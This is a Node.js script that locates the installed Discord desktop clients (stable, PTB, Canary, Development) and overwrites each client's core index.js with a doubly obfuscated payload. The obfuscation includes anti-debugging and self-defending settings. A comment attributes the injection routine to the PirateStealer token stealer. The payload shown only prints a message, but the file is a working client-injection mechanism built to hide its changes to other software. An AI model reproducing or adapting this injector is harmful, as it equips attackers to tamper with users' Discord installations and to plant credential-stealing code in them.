const fs = require("fs"),
    glob = require("glob"),
    JavaScriptObfuscator = require('javascript-obfuscator'); //https://www.npmjs.com/package/javascript-obfuscator (obfuscator.io)

var HelloWorld = [ process.env.LOCALAPPDATA, [ "HelloWorld", "13375P34K", "Discord", "DiscordH4x", "Discord V1.3.3.7", "github.com/HideakiAtsuyo" ],  [  ], [ "Discord", "DiscordPTB", "DiscordCanary", "DiscordDevelopment" ] ];

HelloWorld[2] = [`[${HelloWorld[1][Math.floor(Math.random() * HelloWorld[1].length)]}] DiscordOverLoadingCrash`];

(async ()=>{
    var message = HelloWorld[2][0];
    var options = {
        compact: true,
        config: '',
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        deadCodeInjection: true,
        deadCodeInjectionThreshold: 1,
        debugProtection: true,
        debugProtectionInterval: 1,
        disableConsoleOutput: true,            
        domainLock: [],
        exclude: [],
        forceTransformStrings: [],
        identifierNamesGenerator: 'hexadecimal',
        identifiersPrefix: 'ha_',
        identifiersDictionary: [],
        ignoreRequireImports: false,
        inputFileName: '',
        log: false,
        numbersToExpressions: true,
        optionsPreset: 'high-obfuscation',
        renameGlobals: false,
        renameProperties: false,
        renamePropertiesMode: 'safe',
        reservedNames: [],
        reservedStrings: [],
        rotateStringArray: true,
        seed: 0,
        selfDefending: true,
        shuffleStringArray: true,
        simplify: true,
        sourceMap: false,
        sourceMapBaseUrl: '',
        sourceMapFileName: '',
        sourceMapMode: 'separate',
        splitStrings: true,
        splitStringsChunkLength: 5, //10
        stringArray: true,
        stringArrayEncoding: ['rc4'],
        stringArrayIndexesType: ['hexadecimal-number'],
        stringArrayIndexShift: true,
        stringArrayWrappersChainedCalls: true,
        stringArrayWrappersCount: 5,
        stringArrayWrappersParametersMaxCount: 5,
        stringArrayWrappersType: 'function',
        stringArrayThreshold: 1,
        target: 'node',
        transformObjectKeys: true,
        unicodeEscapeSequence: false
    }

    var obfuscationResult = `${JavaScriptObfuscator.obfuscate(JavaScriptObfuscator.obfuscate(`(async ()=>{console.log("${message}")})();`, options)._obfuscatedCode, options)._obfuscatedCode}\nmodule.exports = require('./core.asar');`;

    HelloWorld[3].forEach(function(folderName) { //https://github.com/Stanley-GF/PirateStealer/blob/main/src/injector/index-win.js#L38-L43
        glob.sync(`${HelloWorld[0]}\\${folderName}\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js`).map(file => {
            fs.writeFile(`${file}`, obfuscationResult, err => {
                if (err){
                    console.error(err);
                    return;
                }
            })
        })
    });
})();